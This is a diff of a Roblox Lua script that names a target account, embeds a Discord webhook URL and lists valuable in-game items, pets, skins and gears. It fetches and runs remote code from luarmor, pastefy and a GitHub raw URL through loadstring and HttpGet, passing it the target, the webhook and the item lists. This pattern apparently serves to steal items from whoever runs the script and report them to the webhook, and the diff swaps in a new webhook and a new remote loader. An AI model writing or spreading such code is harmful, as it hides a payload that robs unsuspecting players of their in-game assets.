@@ -1,18 +1,16 @@
 local TARGET_ID = 4614344287
 local TARGET_USER = "Nfl738ggj"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1570945813952208931/Mr6EZTbMjWPOjrEZDaZnc0UmBhW1oY2JqMABZjSTG_jvGwtoG0Waz2QFhl96H0Nplxh3"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573749896492744714/t7SVFbxR8Mgc1rtUJgMGYT_N-U9mCvXpSQ1u7Im_GBGp06yPiKG55DBemC5UiJV17ZyU"
 
 local TargetBrainrots = {
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
-    ["John Pork"] = true,
-    ["Headless Horseman"] = true,
     ["Dragon Skeletonini"] = true,
     ["Phoenix"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
     ["Los Dragons"] = true,
     ["La Craft Machine"] = true,
     ["Gold and Diamond"] = true,
@@ -22,6 +20,7 @@ local TargetBrainrots = {
     ["Hydra Dragon Cannelloni"] = true,
     ["Hydra Bunny"] = true,
     ["Antonio"] = true,
+    ["John Pork"] = true,
     ["Elefanto Frigo"] = true,
     ["Rubrikiko"] = true,
     ["Pancake and Syrup"] = true,
@@ -35,6 +34,7 @@ local TargetBrainrots = {
     ["Dragon Aquanini"] = true,
     ["La Casa Boo"] = true,
     ["La Supreme Combinasion"] = true,
+    ["Headless Horseman"] = true,
     ["Signore Carapace"] = true,
     ["Fishino Clownino"] = true,
     ["4th Bros"] = true,
@@ -287,7 +287,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Cobra Gelato"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Sammyni Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
@@ -296,7 +304,6 @@ local TargetBaseSkins = {
     ["Candy"] = true,
     ["Christmas"] = true,
     ["Cursed"] = true,
-    ["Cyber"] = true,
     ["Diamond"] = true,
     ["Divine"] = true,
     ["Easter"] = true,
@@ -342,14 +349,15 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
-end)
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/cce44f6b5979ed83d9b5854955ed2da6.lua"))()
 
-task.spawn(function()
+    task.wait(1)
+
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
